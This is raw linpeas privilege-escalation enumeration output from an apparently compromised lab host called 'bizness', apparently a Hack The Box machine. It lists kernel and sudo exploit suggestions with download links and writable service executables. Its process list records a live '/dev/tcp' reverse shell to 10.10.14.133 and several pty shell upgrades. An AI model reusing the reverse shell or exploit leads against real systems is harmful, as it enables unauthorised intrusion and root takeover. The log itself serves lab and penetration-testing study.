bash linpeas.sh             


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\                                                                   
    |                             Do you like PEASS?                                  |                                                                   
    |---------------------------------------------------------------------------------|                                                                   
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                   
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                   
    |         Respect on HTB            :     SirBroccoli                             |                                                                   
    |---------------------------------------------------------------------------------|                                                                   
    |                                 Thank you!                                      |                                                                   
    \---------------------------------------------------------------------------------/                                                                   
          linpeas-ng by carlospolop                                          
                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                          
                                                                             
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                                 
 LEGEND:                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                       
                               ╚═══════════════════╝                         
OS: Linux version 5.10.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.197-1 (2023-09-29)
User & Groups: uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
Hostname: bizness
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                         
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                    
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                            
                                                                             
                                                                             

Caching directories DONE
                                                                             
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                        
                              ╚════════════════════╝                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                        
Linux version 5.10.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.197-1 (2023-09-29)
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                           
Sudo version 1.9.5p2                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                   
/usr/lib/jvm/java-11-openjdk-amd64/bin:/bin:/sbin:/usr/bin:/usr/sbin         

╔══════════╣ Date & uptime
Mon 15 Jan 2024 04:47:17 PM EST                                              
 16:47:17 up  7:27,  1 user,  load average: 0.69, 0.36, 0.16

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                         
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                    
/dev/sda1 /               ext4    errors=remount-ro 0       1                
/dev/sda2 none            swap    sw              0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                      
SHELL=/bin/bash                                                              
HISTSIZE=0
JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
PWD=/home/ofbiz
LOGNAME=ofbiz
HOME=/home/ofbiz
LANG=en_US.UTF-8
HISTFILE=/dev/null
INVOCATION_ID=5a33c5861efe49138baa0614c377c60c
USER=ofbiz
SHLVL=2
JOURNAL_STREAM=8:13815
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/sbin:/usr/local/bin
HISTFILESIZE=0
OLDPWD=/home/ofbiz
_=/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                    
dmesg Not Found                                                              
                                                                             
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                           
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops               

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                      
                                                                             
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                     
═╣ PaX bins present? .............. PaX Not Found                            
═╣ Execshield enabled? ............ Execshield Not Found                     
═╣ SELinux enabled? ............... sestatus Not Found                       
═╣ Seccomp enabled? ............... disabled                                 
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                             

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                       
                                   ╚═══════════╝                             
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                               
╔══════════╣ Container details                                               
═╣ Is this a container? ........... No                                       
═╣ Any running containers? ........ No                                       
                                                                             

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                       
                                     ╚═══════╝                               
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                        
                ╚════════════════════════════════════════════════╝           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                               
root           1  0.0  0.2 100168  9972 ?        Ss   09:19   0:02 /sbin/init
root         406  0.3  2.5 217252 99952 ?        Ss   09:20   1:43 /lib/systemd/systemd-journald
root         428  0.0  0.1  21588  4388 ?        Ss   09:20   0:00 /lib/systemd/systemd-udevd
systemd+     480  0.0  0.1  88436  5936 ?        Ssl  09:20   0:01 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         482  0.0  0.2  47740 10300 ?        Ss   09:20   0:00 /usr/bin/VGAuthService                                                                 
root         483  0.0  0.2 236736  8792 ?        Ssl  09:20   0:26 /usr/bin/vmtoolsd                                                                      
root         532  0.0  0.0   6744  2760 ?        Ss   09:20   0:00 /usr/sbin/cron -f                                                                      
message+     533  0.0  0.1   8276  4444 ?        Ss   09:20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         539  0.0  0.1  99884  5812 ?        Ssl  09:20   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
ofbiz        541  0.2  3.1 2598128 124996 ?      Ssl  09:20   1:14 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -Xmx64m -Dorg.gradle.appname=gradlew -classpath /opt/ofbiz/gradle/wrapper/gradle-wrapper.jar org.gradle.wrapper.GradleWrapperMain ofbiz
ofbiz        737  1.2  9.4 2336284 375544 ?      Ssl  09:20   5:26  _ /usr/lib/jvm/java-11-openjdk-amd64/bin/java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.invoke=ALL-UNNAMED --add-opens java.prefs/java.util.prefs=ALL-UNNAMED -XX:MaxMetaspaceSize=256m -XX:+HeapDumpOnOutOfMemoryError -Xmx512m -Dfile.encoding=UTF-8 -Duser.country=US -Duser.language=en -Duser.variant -cp /home/ofbiz/.gradle/wrapper/dists/gradle-5.0-rc-5-bin/9kyes9gdbh9574f7kbdaemipg/gradle-5.0-rc-5/lib/gradle-launcher-5.0.jar org.gradle.launcher.daemon.bootstrap.GradleDaemon 5.0-rc-5
ofbiz        868  4.0 20.1 3804132 802660 ?      Sl   09:20  18:17      _ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djdk.serialFilter=maxarray=100000;maxdepth=20;maxrefs=1000;maxbytes=500000 -Xms128M -Xmx1024M -Dfile.encoding=UTF-8 -Duser.country=US -Duser.language=en -Duser.variant -cp /opt/ofbiz/build/libs/ofbiz.jar org.apache.ofbiz.base.start.Start                             
ofbiz       1103  0.0  0.0   2480   464 ?        S    09:26   0:00          _ sh -c sh
ofbiz       1105  0.0  0.0   2480   460 ?        S    09:26   0:00          |   _ sh
ofbiz       1106  0.0  0.1  14776  7776 ?        S    09:27   0:00          |       _ python3 -c import pty; pty.spawn("/bin/bash")
ofbiz       1107  0.0  0.0   7828  3396 pts/0    Ss+  09:27   0:00          |           _ /bin/bash
ofbiz      17060  0.0  0.0   2480   464 ?        S    11:11   0:00          _ sh -c bash
ofbiz      17062  0.0  0.0   6816  2076 ?        S    11:11   0:00          |   _ bash
ofbiz      17064  0.0  0.1  14904  7800 ?        S    11:12   0:00          |       _ python3 -c import pty;pty.spawn('/bin/bash')
ofbiz      17065  0.0  0.0   7828  3296 pts/2    Ss+  11:12   0:00          |           _ /bin/bash
ofbiz      49235  0.0  0.0   6816  2144 ?        S    12:50   0:00          _ bash
root       49341  0.0  0.1   9992  4568 ?        S    13:07   0:00          |   _ su
root       49351  0.0  0.0   6816  2208 ?        S    13:07   0:00          |       _ bash
ofbiz      49251  0.0  0.0   6816  2008 ?        S    12:53   0:00          _ bash -c bash -i >& /dev/tcp/10.10.14.133/8000 0>&1;
ofbiz      49253  0.0  0.0   7836  3932 ?        S    12:53   0:00          |   _ bash -i
ofbiz      49655  0.0  0.0   6816  2804 ?        S    14:52   0:00          _ bash
ofbiz      49662  0.0  0.0   2480   468 ?        S    14:54   0:00          _ sh -c sh
ofbiz      49663  0.0  0.0   2480   396 ?        S    14:54   0:00          |   _ sh
ofbiz      49664  0.0  0.1  15040  7916 ?        S    14:54   0:00          |       _ python3 -c import pty; pty.spawn("/bin/bash")
ofbiz      49665  0.0  0.1   7828  4060 pts/1    Ss+  14:54   0:00          |           _ /bin/bash
ofbiz      70766  0.0  0.0   6816  3188 ?        S    16:36   0:00          _ bash
ofbiz      98530  0.5  0.1   8912  5500 ?        S    16:47   0:00              _ bash linpeas.sh
ofbiz     101629  0.0  0.0   8912  3628 ?        S    16:47   0:00                  _ bash linpeas.sh
ofbiz     101632  0.0  0.0   9908  3328 ?        R    16:47   0:00                  |   _ ps fauxwww
ofbiz     101633  0.0  0.0   8912  2444 ?        S    16:47   0:00                  _ bash linpeas.sh
root         546  0.1  0.1 220796  6584 ?        Ssl  09:20   0:49 /usr/sbin/rsyslogd -n -iNONE
root         551  0.0  0.1  13856  7248 ?        Ss   09:20   0:00 /lib/systemd/systemd-logind
ofbiz      82248  0.0  0.1  14716  5928 ?        S    16:44   0:00      _ sshd: ofbiz@pts/3                                                               
ofbiz      82249  0.0  0.1   8008  4708 pts/3    Ss+  16:44   0:00          _ -bash
root         587  0.0  0.0   5844  1700 tty1     Ss+  09:20   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         647  0.0  0.0  57064  1600 ?        Ss   09:20   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data     659  1.1  0.2  59124  9988 ?        S    09:20   4:56  _ nginx: worker process
www-data     660  0.7  0.2  59344 10220 ?        S    09:20   3:20  _ nginx: worker process
root       49343  0.0  0.2  15052  8360 ?        Ss   13:07   0:00 /lib/systemd/systemd --user
root       49344  0.0  0.0 101204  2444 ?        S    13:07   0:00  _ (sd-pam)
ofbiz      65760  0.6  9.5 2330872 379624 ?      Ssl  15:13   0:35 /usr/lib/jvm/java-11-openjdk-amd64/bin/java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.invoke=ALL-UNNAMED --add-opens java.prefs/java.util.prefs=ALL-UNNAMED -XX:MaxMetaspaceSize=256m -XX:+HeapDumpOnOutOfMemoryError -Xmx512m -Dfile.encoding=UTF-8 -Duser.country=US -Duser.language=en -Duser.variant -cp /home/ofbiz/.gradle/wrapper/dists/gradle-5.0-rc-5-bin/9kyes9gdbh9574f7kbdaemipg/gradle-5.0-rc-5/lib/gradle-launcher-5.0.jar org.gradle.launcher.daemon.bootstrap.GradleDaemon 5.0-rc-5
ofbiz      82238  0.0  0.2  15152  8060 ?        Ss   16:44   0:00 /lib/systemd/systemd --user
ofbiz      82239  0.0  0.0 103124  2548 ?        S    16:44   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)                                                             
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes 
                                                                             
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user    
Proc 480 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                                            
Proc 533 with ppid 1 is run by user messagebus but the ppid user is root
Proc 541 with ppid 1 is run by user ofbiz but the ppid user is root
Proc 659 with ppid 647 is run by user www-data but the ppid user is root
Proc 660 with ppid 647 is run by user www-data but the ppid user is root
Proc 65760 with ppid 1 is run by user ofbiz but the ppid user is root
Proc 82238 with ppid 1 is run by user ofbiz but the ppid user is root
Proc 82248 with ppid 82235 is run by user ofbiz but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                        
COMMAND      PID   TID TASKCMD               USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                        
gdm-password Not Found                                                       
gnome-keyring-daemon Not Found                                               
lightdm Not Found                                                            
vsftpd Not Found                                                             
apache2 Not Found                                                            
sshd: process found (dump creds from memory as root)                         

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                    
/bin/crontab                                                                 
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                     

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.daily:
total 28
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
-rwxr-xr-x  1 root root 1298 Aug 31  2022 dpkg
-rwxr-xr-x  1 root root  377 Jan 30  2022 logrotate
-rwxr-xr-x  1 root root 1123 Feb 19  2021 man-db
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rwxr-xr-x  1 root root  813 Feb 19  2021 man-db
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                            
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin            

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services  
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                         
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                         
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                                                 
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                                                 
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers    
NEXT                        LEFT        LAST                        PASSED      UNIT                         ACTIVATES
Tue 2024-01-16 00:00:00 EST 7h left     Mon 2024-01-15 09:20:29 EST 7h ago      logrotate.timer              logrotate.service
Tue 2024-01-16 00:00:00 EST 7h left     Mon 2024-01-15 09:20:29 EST 7h ago      man-db.timer                 man-db.service
Tue 2024-01-16 03:16:48 EST 10h left    Mon 2024-01-15 14:45:56 EST 2h 2min ago apt-daily.timer              apt-daily.service
Tue 2024-01-16 06:59:24 EST 14h left    Mon 2024-01-15 09:26:00 EST 7h ago      apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2024-01-16 09:35:00 EST 16h left    Mon 2024-01-15 09:35:00 EST 7h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2024-01-21 03:10:19 EST 5 days left Mon 2024-01-15 09:20:36 EST 7h ago      e2scrub_all.timer            e2scrub_all.service
Mon 2024-01-22 00:01:53 EST 6 days left Mon 2024-01-15 10:37:53 EST 6h ago      fstrim.timer                 fstrim.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers    
                                                                             
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets   
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                                        
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                   
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                      
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                   
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                            
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                            

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets   
/run/dbus/system_bus_socket                                                  
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/0/systemd/private
/run/user/1001/systemd/inaccessible/sock
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus     
                                                                             
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus     
NAME                         PID PROCESS         USER             CONNECTION    UNIT                      SESSION DESCRIPTION
:1.0                         480 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -
:1.1                           1 systemd         root             :1.1          init.scope                -       -
:1.2                         551 systemd-logind  root             :1.2          systemd-logind.service    -       -
:1.28                      49343 systemd         root             :1.28         user@0.service            -       -
:1.49                      82238 systemd         ofbiz            :1.49         user@1001.service         -       -
:1.61                     104780 busctl          ofbiz            :1.61         ofbiz.service             -       -
org.freedesktop.DBus           1 systemd         root             -             init.scope                -       -
org.freedesktop.hostname1      - -               -                (activatable) -                         -       -
org.freedesktop.locale1        - -               -                (activatable) -                         -       -
org.freedesktop.login1       551 systemd-logind  root             :1.2          systemd-logind.service    -       -
org.freedesktop.network1       - -               -                (activatable) -                         -       -
org.freedesktop.resolve1       - -               -                (activatable) -                         -       -
org.freedesktop.systemd1       1 systemd         root             :1.1          init.scope                -       -
org.freedesktop.timedate1      - -               -                (activatable) -                         -       -
org.freedesktop.timesync1    480 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                       
                              ╚═════════════════════╝                        
╔══════════╣ Hostname, hosts and DNS
bizness                                                                      
127.0.0.1       localhost
127.0.1.1       bizness

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 8.8.8.8

╔══════════╣ Interfaces
default         0.0.0.0                                                      
loopback        127.0.0.0
link-local      169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.252  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:ccf6  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:ccf6  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:cc:f6  txqueuelen 1000  (Ethernet)
        RX packets 3202933  bytes 427077853 (407.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2816718  bytes 2229799101 (2.0 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 9056022  bytes 2708739487 (2.5 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9056022  bytes 2708739487 (2.5 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      868/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::34903                :::*                    LISTEN      737/java            
tcp6       0      0 127.0.0.1:8443          :::*                    LISTEN      868/java            
tcp6       0      0 127.0.0.1:10523         :::*                    LISTEN      868/java            
